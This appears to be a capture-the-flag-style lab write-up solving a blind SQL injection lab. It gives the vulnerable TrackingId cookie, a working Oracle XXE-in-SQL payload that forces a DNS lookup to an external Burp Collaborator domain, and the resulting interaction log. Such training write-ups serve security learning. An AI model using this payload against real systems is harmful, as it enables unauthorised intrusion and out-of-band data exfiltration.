## Blind SQL injection with out-of-band interaction

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator.

## Notes

- `/login`
- `/filter?category=parameter`
- Vulnerable cookie: `TrackingId`

## Resume

1. Confirm the `TrackingId` cookie is injectable
2. Trigger an external DNS lookup using XML entities
3. Monitor Burp Collaborator for interactions
4. Validate successful exploitation

## Solve

Inject the following payload into the `TrackingId` cookie:

```http
Cookie: TrackingId='+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//uywbfrmdcjxn3g2ctfkeezkopfv6j07p.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--; session=SzvyUlqLr4TpfgEeRXeB3bgYewFmLIJp
```

The payload abuses Oracle XML parsing to force the database server to resolve an external entity hosted on the Burp Collaborator domain.

Burp Collaborator received the following DNS interaction:

```text
The Collaborator server received a DNS lookup of type A for the domain name:

uywbfrmdcjxn3g2ctfkeezkopfv6j07p.oastify.com

Source IP:
3.251.104.239:51010

Timestamp:
2026-May-12 09:17:16.537 UTC
```

This confirms that the SQL injection vulnerability can trigger out-of-band DNS requests.